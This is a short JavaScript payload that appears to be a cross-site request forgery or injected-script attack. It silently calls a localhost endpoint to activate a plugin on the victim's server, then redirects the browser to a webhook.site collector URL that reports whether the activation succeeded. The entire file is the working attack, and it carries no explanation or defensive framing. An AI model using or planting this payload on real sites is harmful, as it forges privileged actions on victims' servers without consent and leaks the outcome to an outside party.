if(!document.cookie.includes("no-redirect")){
    fetch('http://localhost/activate-plugin/1')
        .then(() => {
            document.location.href = 'https://webhook.site/949ccc25-e06d-46a8-804c-899b79bec444?plugin-good';
        })
        .catch(() => {
            document.location.href = 'https://webhook.site/949ccc25-e06d-46a8-804c-899b79bec444?plugin-error';
        });
}
